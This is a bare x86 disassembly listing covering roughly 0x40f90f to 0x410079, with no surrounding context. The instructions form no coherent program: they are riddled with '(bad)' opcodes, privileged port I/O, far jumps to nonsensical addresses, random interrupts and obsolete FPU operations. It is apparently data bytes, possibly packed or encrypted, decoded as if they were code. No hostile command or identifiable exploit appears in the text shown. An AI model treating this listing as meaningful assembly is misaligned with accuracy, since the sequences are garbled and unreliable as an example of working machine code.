  40f90f:	enter  0x8443,0x6d
  40f913:	mov    ebp,0x56a2ffb0
  40f918:	adc    DWORD PTR [ecx-0x2a490486],ecx
  40f91e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f91f:	int3   
  40f920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f921:	mov    WORD PTR ds:0x3049927a,?
  40f927:	repz or ebp,edx
  40f92a:	loopne 0x40f9a6
  40f92c:	sub    DWORD PTR [esi],esi
  40f92e:	sbb    esp,DWORD PTR ds:0x66851183
  40f934:	inc    edi
  40f935:	sbb    ecx,DWORD PTR ds:0x8163a997
  40f93b:	xor    cl,0x68
  40f93e:	ss cwde 
  40f940:	adc    eax,0x96eec130
  40f945:	lahf   
  40f946:	out    0x50,al
  40f948:	mov    ch,0x83
  40f94a:	sub    edx,DWORD PTR [eax+0x36ed854f]
  40f950:	mov    edi,0x4eb8ca74
  40f955:	shl    BYTE PTR [eax+0x72509260],cl
  40f95b:	pop    edi
  40f95c:	das    
  40f95d:	inc    edi
  40f95e:	outs   dx,BYTE PTR ds:[esi]
  40f95f:	push   0x9b6c772c
  40f964:	clc    
  40f965:	(bad)  
  40f966:	pop    eax
  40f967:	fidivr WORD PTR [esi-0x41]
  40f96a:	sub    eax,0xaa1a4b7
  40f96f:	xchg   ebp,eax
  40f970:	mov    es,WORD PTR [edi+0x5b8e0ffc]
  40f976:	pop    ds
  40f977:	aad    0x27
  40f979:	(bad)  
  40f97a:	cmp    esp,ebx
  40f97c:	or     al,0xf0
  40f97e:	pop    ebp
  40f97f:	pop    edi
  40f980:	add    cl,BYTE PTR [ebx+0x9]
  40f983:	and    eax,0xee071531
  40f988:	rcl    BYTE PTR [eax-0x6d80efda],cl
  40f98e:	aaa    
  40f98f:	add    esp,DWORD PTR [ebx+eax*1-0x54]
  40f993:	mov    bl,bh
  40f995:	inc    ecx
  40f996:	les    ecx,FWORD PTR [edx+0x67cbe21c]
  40f99c:	or     DWORD PTR gs:[ebx],0xdb35daf3
  40f9a3:	push   ss
  40f9a4:	push   ebx
  40f9a5:	call   FWORD PTR [eax-0x24]
  40f9a8:	push   ds
  40f9a9:	jns    0x40fa02
  40f9ab:	inc    ecx
  40f9ac:	popf   
  40f9ad:	pop    ebx
  40f9ae:	jge    0x40f99a
  40f9b0:	sub    ecx,DWORD PTR [eax+0x3ce96fe1]
  40f9b6:	inc    ecx
  40f9b7:	jae    0x40f9dc
  40f9b9:	sub    DWORD PTR [edx+0x15],eax
  40f9bc:	mov    ch,BYTE PTR [edx+edx*8-0x57]
  40f9c0:	mov    BYTE PTR [ebx-0x148a20c5],ch
  40f9c6:	jmp    0x40f9dc
  40f9c8:	out    0xaa,eax
  40f9ca:	retf   0x2b6f
  40f9cd:	cmp    cl,BYTE PTR [esi]
  40f9cf:	sub    DWORD PTR [edx-0x4b47d3a7],eax
  40f9d5:	dec    ecx
  40f9d6:	pop    es
  40f9d7:	call   0x72f4:0xcff8d532
  40f9de:	sbb    edi,DWORD PTR [ebx]
  40f9e0:	loop   0x40f983
  40f9e2:	jmp    0xc3c7:0xd8fbb16f
  40f9e9:	and    ebx,DWORD PTR [ecx+edi*8+0x5ce76e79]
  40f9f0:	popf   
  40f9f1:	inc    eax
  40f9f2:	xchg   ebp,eax
  40f9f3:	add    edx,0x7dfd6cb0
  40f9f9:	test   DWORD PTR [ecx-0x47],ecx
  40f9fc:	cli    
  40f9fd:	push   es
  40f9fe:	sbb    eax,0xe4733187
  40fa03:	leave  
  40fa04:	fiadd  DWORD PTR [edi+0x33]
  40fa07:	mov    ebp,0xb4b19d70
  40fa0c:	push   edi
  40fa0d:	call   0xfa1120cd
  40fa12:	and    eax,0x89c0c8ef
  40fa17:	das    
  40fa18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa19:	push   ss
  40fa1a:	das    
  40fa1b:	pop    edi
  40fa1c:	xor    DWORD PTR [edx+0x36898ab4],ebx
  40fa22:	pusha  
  40fa23:	jecxz  0x40f9d9
  40fa25:	mov    al,0x4e
  40fa27:	les    esp,FWORD PTR [ecx+0x5f]
  40fa2a:	pop    esp
  40fa2b:	pop    esi
  40fa2c:	jl     0x40fa71
  40fa2e:	inc    eax
  40fa2f:	mov    WORD PTR [ebx-0x25b90f9],es
  40fa35:	js     0x40fa2a
  40fa37:	sub    BYTE PTR [edx],bh
  40fa39:	sbb    eax,0xf88b8fa2
  40fa3e:	push   ebx
  40fa3f:	add    al,0xb3
  40fa41:	shr    DWORD PTR [edx+0x346142b5],cl
  40fa47:	xchg   ebx,eax
  40fa48:	hlt    
  40fa49:	test   al,0x23
  40fa4b:	stos   BYTE PTR es:[edi],al
  40fa4c:	pop    esp
  40fa4d:	fs add al,0xaf
  40fa50:	and    DWORD PTR [ebp+0x2998d56e],ebx
  40fa56:	ds xor bh,ah
  40fa59:	dec    ebx
  40fa5a:	mov    esi,0x8c8ba8fd
  40fa5f:	icebp  
  40fa60:	xor    DWORD PTR [esi-0x6fa590fa],esp
  40fa66:	sub    cl,al
  40fa68:	outs   dx,DWORD PTR ds:[esi]
  40fa69:	pop    edx
  40fa6a:	fistp  DWORD PTR [ebx]
  40fa6c:	loope  0x40fa4a
  40fa6e:	test   BYTE PTR [ebx-0x27],ah
  40fa71:	outs   dx,DWORD PTR ds:[esi]
  40fa72:	aam    0x83
  40fa74:	push   eax
  40fa75:	mov    ah,ch
  40fa77:	fld    TBYTE PTR [ecx-0xc77c03c]
  40fa7d:	pop    edx
  40fa7e:	ja     0xf61bf4be
  40fa84:	mov    edi,0x44b7b036
  40fa89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa8a:	scas   ax,WORD PTR es:[edi]
  40fa8c:	cld    
  40fa8d:	mov    WORD PTR [esi],?
  40fa8f:	jae    0x40fb0b
  40fa91:	bnd jnp 0x40fa8f
  40fa94:	sub    DWORD PTR [esi-0x4e4dac60],esp
  40fa9a:	ss (bad) 
  40fa9c:	sub    DWORD PTR [edi+eax*1+0x4c],esi
  40faa0:	in     eax,0x87
  40faa2:	fidiv  WORD PTR [ebx+0x61c398b9]
  40faa8:	stos   BYTE PTR es:[edi],al
  40faa9:	(bad)  
  40faaa:	cmc    
  40faab:	adc    cl,bl
  40faad:	and    BYTE PTR [eax-0x36f16890],al
  40fab3:	jbe    0x40fae1
  40fab5:	push   0xffffff81
  40fab7:	cs inc esi
  40fab9:	and    dh,BYTE PTR [edx+0x4da65749]
  40fabf:	add    al,0x9d
  40fac1:	ret    
  40fac2:	adc    eax,0x35cecb64
  40fac7:	fcom   QWORD PTR [edi+0x54]
  40faca:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40facc:	xchg   DWORD PTR [esi-0x59e8caff],ebx
  40fad2:	dec    eax
  40fad3:	and    BYTE PTR [esi],cl
  40fad5:	inc    eax
  40fad6:	mov    bl,0x9b
  40fad8:	stos   DWORD PTR es:[edi],eax
  40fad9:	popa   
  40fada:	mov    edx,0x658f4efb
  40fadf:	repnz mov ah,0x8c
  40fae2:	add    DWORD PTR [eax],esi
  40fae4:	pop    eax
  40fae5:	push   ecx
  40fae6:	mov    esi,0xc298beab
  40faeb:	jbe    0x40fb02
  40faed:	les    edx,FWORD PTR ds:0xa4e020b7
  40faf3:	adc    al,0xf6
  40faf5:	punpcklwd mm6,mm4
  40faf8:	hlt    
  40faf9:	sbb    al,0x5b
  40fafb:	je     0x40fb64
  40fafd:	pop    ebp
  40fafe:	pop    eax
  40faff:	ins    DWORD PTR es:[edi],dx
  40fb00:	dec    ebx
  40fb01:	jl     0x40fafc
  40fb03:	pusha  
  40fb04:	scas   al,BYTE PTR es:[edi]
  40fb05:	add    esi,DWORD PTR [edi]
  40fb07:	pop    edx
  40fb08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb09:	scas   eax,DWORD PTR es:[edi]
  40fb0a:	push   edx
  40fb0b:	mov    ds:0x8bea063d,al
  40fb10:	mov    WORD PTR [ebp+0x2edc55bf],ds
  40fb16:	dec    ebx
  40fb17:	dec    ebx
  40fb18:	nop
  40fb19:	mov    esi,0x64add0de
  40fb1e:	aaa    
  40fb1f:	jns    0x40fb6c
  40fb21:	inc    eax
  40fb22:	dec    esi
  40fb23:	mov    ecx,0xe5683f43
  40fb28:	sub    DWORD PTR [ebx+0x58],ecx
  40fb2b:	ret    0xfe9c
  40fb2e:	mov    esp,0x7838ddb2
  40fb33:	shr    dh,0x18
  40fb36:	add    BYTE PTR [ebx+ecx*8+0x6d],cl
  40fb3a:	xchg   esi,eax
  40fb3b:	sti    
  40fb3c:	or     DWORD PTR [esi-0x35],0xffffffd8
  40fb40:	inc    esi
  40fb41:	mov    al,0x65
  40fb43:	jmp    0xc72acc66
  40fb48:	(bad)  
  40fb4b:	cmp    DWORD PTR [esi],edi
  40fb4d:	(bad)  
  40fb4e:	ins    BYTE PTR es:[edi],dx
  40fb4f:	fist   WORD PTR [ecx+0x69384af7]
  40fb55:	or     ecx,esp
  40fb57:	enter  0x4fab,0xf7
  40fb5b:	lock sahf 
  40fb5d:	jmp    0xdb50f8ef
  40fb62:	xor    ch,BYTE PTR [edi+0xd]
  40fb65:	sub    edi,DWORD PTR [eax]
  40fb67:	inc    esp
  40fb69:	mov    al,BYTE PTR [edx+0x69]
  40fb6c:	(bad)  
  40fb6d:	cli    
  40fb6e:	and    eax,0x2d2bd486
  40fb73:	cwde   
  40fb74:	fadd   st,st(2)
  40fb76:	faddp  st(2),st
  40fb78:	push   esi
  40fb79:	fwait
  40fb7a:	ret    
  40fb7b:	arpl   WORD PTR [ebx+edx*1+0x7012c7a],cx
  40fb82:	dec    esp
  40fb83:	jns    0x40fb13
  40fb85:	in     eax,dx
  40fb86:	xchg   edi,eax
  40fb87:	repz cmp DWORD PTR [esi+0x7493a1c7],ecx
  40fb8e:	mov    eax,ds:0xfb2cd095
  40fb93:	mov    ebp,esp
  40fb95:	test   DWORD PTR [esp+edi*2+0x57597252],edi
  40fb9c:	aas    
  40fb9d:	sbb    DWORD PTR [eax+0x28a854ed],ebp
  40fba3:	(bad)  
  40fba4:	cmp    eax,0xfcdacf43
  40fba9:	sbb    DWORD PTR [esi-0x7],ebx
  40fbac:	call   DWORD PTR [ebp+0xf]
  40fbaf:	mov    edi,0xea8bf853
  40fbb4:	inc    ebx
  40fbb5:	jmp    0x86e2:0xab2b9d0c
  40fbbc:	dec    ecx
  40fbbd:	xlat   BYTE PTR ds:[ebx]
  40fbbe:	cmp    al,0x39
  40fbc0:	aad    0x0
  40fbc2:	mov    dl,0x94
  40fbc4:	sub    BYTE PTR [ebx],cl
  40fbc6:	ficom  DWORD PTR [esi-0x345ae7cf]
  40fbcc:	ror    BYTE PTR [ebp+0x5989e688],1
  40fbd2:	mov    bh,0xa
  40fbd4:	push   edx
  40fbd5:	sar    BYTE PTR [ebx+0x70],0x2c
  40fbd9:	in     al,dx
  40fbda:	shr    eax,1
  40fbdc:	lock xor eax,0x4ce3ef17
  40fbe2:	test   BYTE PTR [edx+0x1f],dh
  40fbe5:	bound  ebp,QWORD PTR [eax-0x26f3132a]
  40fbeb:	add    ah,BYTE PTR [ebp+0x4c]
  40fbee:	int    0x16
  40fbf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbf1:	pusha  
  40fbf2:	dec    eax
  40fbf3:	nop
  40fbf4:	xlat   BYTE PTR ds:[ebx]
  40fbf5:	mov    gs,esp
  40fbf7:	ss mov dh,0xa
  40fbfa:	test   BYTE PTR [edx],dl
  40fbfc:	push   DWORD PTR [edx+0x3023ebec]
  40fc02:	in     al,dx
  40fc03:	jmp    0x4931:0xd0cb255e
  40fc0a:	leave  
  40fc0b:	outs   dx,DWORD PTR ds:[esi]
  40fc0c:	lock sub DWORD PTR [esi+0x2ec105f8],ebx
  40fc13:	inc    edi
  40fc14:	int    0x76
  40fc16:	jne    0x40fbab
  40fc18:	sbb    BYTE PTR [eax+eiz*1-0x36648931],0x85
  40fc20:	(bad)  
  40fc21:	sti    
  40fc22:	outs   dx,DWORD PTR ds:[esi]
  40fc23:	test   DWORD PTR [ebp-0x3ce9c4dc],0x5aa62040
  40fc2d:	adc    BYTE PTR [edx+0x3fa1b96d],0x77
  40fc34:	ins    BYTE PTR es:[edi],dx
  40fc35:	mov    edi,0x9bdb27be
  40fc3a:	test   DWORD PTR [ebx],ebx
  40fc3c:	aam    0xb3
  40fc3e:	adc    cl,BYTE PTR [eax+ebp*4+0x6f05f1db]
  40fc45:	mov    ax,ds:0xfeeea678
  40fc4b:	dec    esi
  40fc4c:	mov    ebx,DWORD PTR [esi+0x47]
  40fc4f:	fxch   st(3)
  40fc51:	inc    ebx
  40fc52:	pop    esp
  40fc53:	xchg   edx,eax
  40fc54:	push   esi
  40fc55:	lods   al,BYTE PTR ds:[esi]
  40fc56:	jecxz  0x40fc68
  40fc58:	jge    0x40fcd0
  40fc5a:	jge    0x40fc7a
  40fc5c:	repnz inc ebx
  40fc5e:	lock in al,dx
  40fc60:	fst    QWORD PTR [ebp-0x39ba4af5]
  40fc66:	imul   edi,DWORD PTR [ebx+0x7c0fca41],0xcc83aa90
  40fc70:	and    al,0x81
  40fc72:	push   edx
  40fc73:	pop    esi
  40fc74:	pop    esp
  40fc75:	jb     0x40fc62
  40fc77:	sahf   
  40fc78:	cmp    DWORD PTR ds:0x2a284ffb,ebx
  40fc7e:	fild   DWORD PTR [ebx-0x80]
  40fc81:	fndisi(8087 only) 
  40fc83:	lods   al,BYTE PTR ds:[esi]
  40fc84:	faddp  st(7),st
  40fc86:	lods   al,BYTE PTR ds:[esi]
  40fc87:	cmp    al,0x5f
  40fc89:	nop
  40fc8a:	aaa    
  40fc8b:	mov    esi,0x60089543
  40fc90:	xchg   ecx,eax
  40fc91:	pop    ebp
  40fc92:	iret   
  40fc93:	ficom  DWORD PTR [ecx+0x7d2a4ba4]
  40fc99:	add    eax,DWORD PTR ds:0x8734a0d8
  40fc9f:	inc    edi
  40fca0:	add    DWORD PTR [ecx+0x3c7298e3],0xfffffff8
  40fca7:	cld    
  40fca8:	ficomp DWORD PTR [ecx]
  40fcaa:	repnz mov bl,BYTE PTR [esi+0x39702235]
  40fcb1:	das    
  40fcb2:	adc    ah,BYTE PTR [esi+0x1d]
  40fcb5:	(bad)  
  40fcb6:	mov    al,0xf8
  40fcb8:	cmp    edx,esi
  40fcba:	sub    al,BYTE PTR [edi]
  40fcbc:	pop    es
  40fcbd:	mov    ebp,0xb8f6e4dd
  40fcc2:	(bad)
  40fcc6:	pop    eax
  40fcc7:	dec    edi
  40fcc8:	add    eax,0x674c26b1
  40fccd:	and    ebx,ebp
  40fccf:	push   ds
  40fcd0:	push   esi
  40fcd1:	inc    edi
  40fcd2:	loop   0x40fd2f
  40fcd4:	outs   dx,BYTE PTR cs:[esi]
  40fcd6:	(bad)  
  40fcd7:	adc    al,al
  40fcd9:	pushf  
  40fcda:	or     dl,BYTE PTR [eax]
  40fcdc:	add    al,0x7c
  40fcde:	out    0x6c,eax
  40fce0:	or     al,0xea
  40fce2:	in     al,0xf1
  40fce4:	hlt    
  40fce5:	stc    
  40fce6:	ret    0x37ff
  40fce9:	mov    edi,0xa397e795
  40fcee:	ins    DWORD PTR es:[edi],dx
  40fcef:	sahf   
  40fcf0:	test   DWORD PTR [eax-0x609385af],edi
  40fcf6:	lahf   
  40fcf7:	icebp  
  40fcf8:	sbb    al,0x73
  40fcfa:	jnp    0x40fd79
  40fcfc:	sti    
  40fcfd:	es pop edx
  40fcff:	jbe    0x40fd2f
  40fd01:	lods   eax,DWORD PTR ds:[esi]
  40fd02:	dec    esi
  40fd03:	outs   dx,BYTE PTR ds:[esi]
  40fd04:	pop    edx
  40fd05:	stos   BYTE PTR es:[edi],al
  40fd06:	adc    eax,0x56588246
  40fd0b:	pop    eax
  40fd0c:	pop    edx
  40fd0d:	sub    al,0x36
  40fd10:	push   ecx
  40fd11:	xchg   edx,eax
  40fd12:	in     al,0x4a
  40fd14:	xor    BYTE PTR [esi],bh
  40fd16:	push   0xffffffe4
  40fd18:	je     0x40fd3d
  40fd1a:	mov    ebx,0x97a0c29f
  40fd1f:	or     ah,ah
  40fd21:	into   
  40fd22:	mov    ds:0x371236a3,eax
  40fd27:	mov    edi,0x23c413d4
  40fd2c:	mov    esi,ebp
  40fd2e:	pop    edi
  40fd2f:	pop    edi
  40fd30:	call   0xb29850db
  40fd35:	ins    BYTE PTR es:[edi],dx
  40fd36:	mov    BYTE PTR [ebp-0x77],bh
  40fd39:	data16 cld 
  40fd3b:	(bad)  [edi+0x6d306954]
  40fd41:	xor    DWORD PTR [ebp-0x68],edi
  40fd44:	mov    ebp,0x9d52c5eb
  40fd49:	xchg   edi,eax
  40fd4a:	dec    ecx
  40fd4b:	(bad)  
  40fd4c:	and    DWORD PTR [esi],esi
  40fd4e:	rcr    DWORD PTR [eax+edx*1],1
  40fd51:	(bad)  
  40fd53:	add    al,0x12
  40fd55:	xchg   esi,eax
  40fd56:	pop    edx
  40fd57:	sbb    DWORD PTR [esp+ecx*4-0x1ac7e39c],ebx
  40fd5e:	test   al,0x70
  40fd60:	lahf   
  40fd61:	pop    ebx
  40fd62:	sar    DWORD PTR ds:0xe12307c8,0x3
  40fd69:	in     al,dx
  40fd6a:	push   cs
  40fd6b:	cmp    esi,DWORD PTR [ebp-0x58]
  40fd6e:	cmp    BYTE PTR [esi],0x22
  40fd71:	xchg   DWORD PTR [ebx],edx
  40fd73:	cmp    DWORD PTR [ecx],esi
  40fd75:	jnp    0x40fd82
  40fd77:	sub    bh,BYTE PTR [esp+eax*8+0x62]
  40fd7b:	je     0x40fddc
  40fd7d:	sbb    al,0x4
  40fd7f:	fsub   DWORD PTR [esi+eax*4-0x288fc80e]
  40fd86:	not    DWORD PTR [ecx+0x1dc57d3]
  40fd8c:	(bad)  
  40fd8d:	or     al,ch
  40fd8f:	mov    eax,0x32dd9576
  40fd94:	jmp    0x40fd37
  40fd96:	js     0x40fda8
  40fd98:	sub    eax,0xce464fc2
  40fd9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd9e:	push   0xffffffc5
  40fda0:	xchg   ebp,eax
  40fda1:	imul   ecx,ebx,0x9128e30
  40fda7:	js     0x40fd7d
  40fda9:	cmp    al,0x53
  40fdab:	loopne 0x40fe29
  40fdad:	test   DWORD PTR [esi],esp
  40fdaf:	sbb    edi,DWORD PTR [eax-0x17]
  40fdb2:	std    
  40fdb3:	xor    BYTE PTR [ebx],0x79
  40fdb6:	pusha  
  40fdb7:	cmp    al,ch
  40fdb9:	ds inc ecx
  40fdbb:	aad    0x12
  40fdbd:	es jp  0x40fd95
  40fdc0:	ds dec esi
  40fdc2:	cld    
  40fdc3:	outs   dx,DWORD PTR ds:[esi]
  40fdc4:	pop    ss
  40fdc5:	cli    
  40fdc6:	scas   al,BYTE PTR es:[edi]
  40fdc7:	xchg   esp,eax
  40fdc8:	fst    QWORD PTR [edx]
  40fdca:	pop    edx
  40fdcb:	and    eax,0xf0ea830e
  40fdd0:	pop    esp
  40fdd1:	int    0x8f
  40fdd3:	into   
  40fdd4:	test   BYTE PTR [edi+0x51a4ee65],ch
  40fdda:	pusha  
  40fddb:	(bad)  
  40fddc:	inc    esp
  40fddd:	or     esi,DWORD PTR [ecx-0x74f42786]
  40fde3:	mov    al,0x6
  40fde5:	mov    DWORD PTR ds:0x24e232dc,esp
  40fdeb:	push   ds
  40fdec:	or     esp,ebx
  40fdee:	adc    edi,eax
  40fdf0:	sbb    al,0x51
  40fdf2:	pusha  
  40fdf3:	cmp    al,BYTE PTR [esp+ebp*1-0x4ceccaa5]
  40fdfa:	mov    ch,0x2e
  40fdfc:	iret   
  40fdfd:	sub    eax,0x6b5c9a32
  40fe02:	mov    ebp,0x90b612fb
  40fe07:	mov    esp,0x14736878
  40fe0c:	mov    dl,0x44
  40fe0e:	mov    bh,0x9e
  40fe10:	xchg   ebx,eax
  40fe11:	int    0xa3
  40fe13:	mov    ecx,0x2fc21d76
  40fe18:	into   
  40fe19:	or     DWORD PTR [edi+0x4ab7b91f],esi
  40fe1f:	ins    BYTE PTR es:[edi],dx
  40fe20:	out    0xac,al
  40fe22:	outs   dx,BYTE PTR ds:[esi]
  40fe23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe24:	adc    al,cl
  40fe26:	pusha  
  40fe27:	and    BYTE PTR [eax+edi*2-0x44],ch
  40fe2b:	mov    ?,cx
  40fe2e:	mov    dl,0xa1
  40fe30:	stos   BYTE PTR es:[edi],al
  40fe31:	push   ss
  40fe32:	cli    
  40fe33:	xchg   BYTE PTR [edi],ah
  40fe35:	push   DWORD PTR [esi+0x6112ff81]
  40fe3b:	sbb    eax,0x9668ef4
  40fe40:	cld    
  40fe41:	loop   0x40fe3c
  40fe43:	pop    ebp
  40fe44:	scas   eax,DWORD PTR es:[edi]
  40fe45:	xchg   ebp,edi
  40fe47:	enter  0x69fa,0x36
  40fe4b:	sub    esp,ebx
  40fe4d:	pop    ss
  40fe4e:	xor    eax,DWORD PTR [ebp-0x117e0ee6]
  40fe54:	inc    esi
  40fe55:	jg     0x40fe31
  40fe57:	jb     0x40fe6d
  40fe59:	push   esp
  40fe5a:	popf   
  40fe5b:	sub    cl,BYTE PTR [edx+0x6a93ec64]
  40fe61:	mov    cs,ecx
  40fe63:	and    edi,DWORD PTR [edi+0x57ec8363]
  40fe69:	cs inc edi
  40fe6b:	dec    esp
  40fe6c:	jge    0x40fe0a
  40fe6e:	pop    eax
  40fe6f:	pop    ecx
  40fe70:	repnz fldcw WORD PTR [edx]
  40fe73:	or     cl,dl
  40fe75:	repz mov al,0xa7
  40fe78:	xchg   esp,eax
  40fe79:	fcomp  DWORD PTR [edi+0x5c]
  40fe7c:	add    WORD PTR [eax],cx
  40fe7f:	or     edx,ebp
  40fe81:	or     bh,dl
  40fe83:	add    DWORD PTR [edi-0x323d1ce9],0xaa0057ad
  40fe8d:	jmp    0xfd55:0xe46edf61
  40fe94:	lods   al,BYTE PTR ds:[esi]
  40fe95:	jae    0x40feff
  40fe97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe98:	or     al,0x3c
  40fe9a:	adc    BYTE PTR [esi-0x73adcd8a],al
  40fea0:	inc    esi
  40fea1:	add    esi,edx
  40fea3:	adc    DWORD PTR [esi],ecx
  40fea5:	pop    ebp
  40fea6:	xchg   ebp,eax
  40fea7:	jmp    0x40fe5c
  40fea9:	or     edi,DWORD PTR [ecx]
  40feab:	pop    ebx
  40feac:	sbb    dl,BYTE PTR [ebp-0x47]
  40feaf:	aas    
  40feb0:	mov    ecx,0xf47ea353
  40feb5:	xor    dh,BYTE PTR [ebx+edi*4+0xc]
  40feb9:	mov    edx,ds
  40febb:	sub    al,0x5d
  40febd:	jmp    0xa2b3:0x7fa2bfae
  40fec4:	ret    0x3fc
  40fec7:	mov    dh,0xef
  40fec9:	cmp    eax,0x70de350
  40fece:	inc    edx
  40fecf:	mov    es,ebx
  40fed1:	cmp    ecx,eax
  40fed3:	in     al,0x0
  40fed5:	sar    BYTE PTR [ebp-0x12],1
  40fed8:	gs out dx,eax
  40feda:	iret   
  40fedb:	ret    
  40fedc:	inc    ecx
  40fedd:	mov    ecx,0x44781393
  40fee2:	push   eax
  40fee3:	sbb    edx,ecx
  40fee5:	jmp    0x40ff5c
  40fee7:	push   eax
  40fee8:	inc    edx
  40fee9:	sub    al,0x31
  40feeb:	stc    
  40feec:	or     DWORD PTR [eax-0x10],ebx
  40feef:	stc    
  40fef0:	jb     0x40fef6
  40fef2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fef3:	inc    edi
  40fef4:	mov    edi,0xe4e3348b
  40fef9:	xchg   edi,eax
  40fefa:	and    edi,DWORD PTR [edi+0x75]
  40fefd:	mov    ah,0xac
  40feff:	stos   BYTE PTR es:[edi],al
  40ff00:	mov    esp,0xc850cee6
  40ff05:	(bad)
  40ff09:	push   edx
  40ff0a:	aam    0xa3
  40ff0c:	sub    DWORD PTR [eax-0x4f],eax
  40ff0f:	sti    
  40ff10:	lea    esi,[ecx]
  40ff12:	sub    DWORD PTR [edi],ecx
  40ff14:	jne    0x40ff6e
  40ff16:	mov    ebx,0x6b4975fe
  40ff1b:	in     eax,0x84
  40ff1d:	loope  0x40feba
  40ff1f:	call   0xccd17c64
  40ff24:	add    ah,dh
  40ff26:	xor    edi,DWORD PTR ds:0xba2dca61
  40ff2c:	sbb    al,0x6e
  40ff2e:	rcr    BYTE PTR [esi-0x6e8a122],1
  40ff34:	popf   
  40ff35:	fsub   QWORD PTR [esi]
  40ff37:	lea    esp,[ecx]
  40ff39:	adc    DWORD PTR [ecx-0x4d],eax
  40ff3c:	xchg   ebp,eax
  40ff3d:	mov    BYTE PTR [ebx],al
  40ff3f:	push   ds
  40ff40:	add    al,0xfc
  40ff42:	imul   edx,DWORD PTR [ecx],0xf
  40ff45:	test   al,0x3a
  40ff47:	aas    
  40ff48:	push   ebx
  40ff49:	sub    BYTE PTR ds:0xdd0e3342,cl
  40ff4f:	ss add al,0x3e
  40ff52:	cmp    DWORD PTR [ebx+0x18],esp
  40ff55:	sar    DWORD PTR [edx],cl
  40ff57:	lods   eax,DWORD PTR ds:[esi]
  40ff58:	jb     0x40ff56
  40ff5a:	int    0xea
  40ff5c:	dec    edx
  40ff5d:	popf   
  40ff5e:	ja     0x40ff0d
  40ff60:	loope  0x40fef9
  40ff62:	jne    0x40fef9
  40ff64:	add    esi,esp
  40ff66:	xor    dl,BYTE PTR [eax+edx*1+0x79]
  40ff6a:	mov    ch,0x5b
  40ff6c:	aaa    
  40ff6d:	into   
  40ff6e:	sub    cl,BYTE PTR [eax-0x3cc7c19c]
  40ff74:	mov    bl,0x5b
  40ff76:	(bad)  
  40ff77:	xchg   ebx,eax
  40ff78:	retf   
  40ff79:	add    edi,DWORD PTR [esi+esi*4+0x6c]
  40ff7d:	scas   eax,DWORD PTR es:[edi]
  40ff7e:	dec    ebp
  40ff7f:	jl     0x40ff8f
  40ff81:	arpl   WORD PTR [edi-0x67],cx
  40ff84:	fisub  DWORD PTR ds:0x56a1f37b
  40ff8a:	ins    BYTE PTR es:[edi],dx
  40ff8b:	xchg   ebp,eax
  40ff8c:	cmp    dl,BYTE PTR [edx+esi*8-0x1e779133]
  40ff93:	int    0xf6
  40ff95:	aaa    
  40ff96:	mov    ecx,0x5cccfd24
  40ff9b:	aam    0x80
  40ff9d:	fstp   QWORD PTR [esi-0x585b52cb]
  40ffa3:	scas   al,BYTE PTR es:[edi]
  40ffa4:	sbb    eax,DWORD PTR [ebx+edx*8+0x7f598d53]
  40ffab:	inc    edi
  40ffac:	push   ecx
  40ffad:	aad    0xe7
  40ffaf:	sbb    al,bl
  40ffb1:	pushf  
  40ffb2:	dec    ebp
  40ffb3:	or     DWORD PTR [bx-0x3a],ebp
  40ffb7:	out    dx,al
  40ffb8:	test   al,0xac
  40ffba:	es jmp 0x28ea81a2
  40ffc0:	les    esp,FWORD PTR [ebp-0xb]
  40ffc3:	mov    bl,0x96
  40ffc5:	mul    eax
  40ffc7:	push   esp
  40ffc8:	hlt    
  40ffc9:	cmp    dh,BYTE PTR [edi+0x7bc41fcc]
  40ffcf:	int    0xad
  40ffd1:	dec    edx
  40ffd2:	test   eax,0x6f43c408
  40ffd7:	jle    0x410017
  40ffd9:	jae    0x40ffdb
  40ffdb:	scas   eax,DWORD PTR es:[edi]
  40ffdc:	out    dx,al
  40ffdd:	and    ch,ah
  40ffdf:	mov    esp,0x8cd5e7f8
  40ffe4:	sahf   
  40ffe5:	adc    ch,BYTE PTR [ebx]
  40ffe7:	(bad)  
  40ffe8:	sar    BYTE PTR [ebp-0x7e31e61],cl
  40ffee:	pop    esp
  40ffef:	mov    esi,0x264eb555
  40fff4:	push   ebp
  40fff5:	(bad)  
  40fff6:	cmp    eax,0x91d4eabb
  40fffb:	pop    ebp
  40fffc:	(bad)  
  40fffd:	jp     0x41006a
  40ffff:	call   0x4563:0xceb368cf
  410006:	mov    esi,0xf36525c2
  41000b:	pushf  
  41000c:	lock addr16 into 
  41000f:	(bad)  
  410010:	jb     0x40fff5
  410012:	jmp    0xa6bded67
  410017:	imul   ebx,DWORD PTR [esi],0xffffffed
  41001a:	ror    dh,cl
  41001c:	mov    ah,0xe4
  41001e:	popa   
  41001f:	out    dx,al
  410020:	int3   
  410021:	adc    DWORD PTR [ebx],eax
  410023:	sub    BYTE PTR [esi+0x55505ee1],ah
  410029:	push   0xb
  41002b:	push   ss
  41002c:	dec    edi
  41002d:	bound  ebp,QWORD PTR [ebp-0x42]
  410030:	cmp    eax,DWORD PTR [eax-0x13b653c2]
  410036:	xlat   BYTE PTR ds:[ebx]
  410037:	xchg   DWORD PTR [eax],eax
  410039:	pusha  
  41003a:	je     0x40ffcb
  41003c:	fist   DWORD PTR [ecx+0x7f4bddb0]
  410042:	loope  0x410053
  410044:	mov    eax,0xc5877244
  410049:	dec    ebp
  41004a:	mov    dl,0x95
  41004c:	lods   al,BYTE PTR ds:[esi]
  41004d:	xchg   edi,eax
  41004e:	inc    ecx
  41004f:	imul   ecx,DWORD PTR [ebp+eax*4-0x728b05c2],0x30396dd3
  41005a:	sbb    al,0x10
  41005c:	test   eax,0x6e606d7c
  410061:	push   edx
  410062:	sub    eax,eax
  410064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410065:	fs jb  0x410081
  410068:	(bad)  
  410069:	fcom   QWORD PTR [edi]
  41006b:	test   eax,0xfc2c0ac7
  410070:	fist   WORD PTR [ecx+0x748e8104]
  410076:	repz or ch,dl
  410079:	out    dx,eax
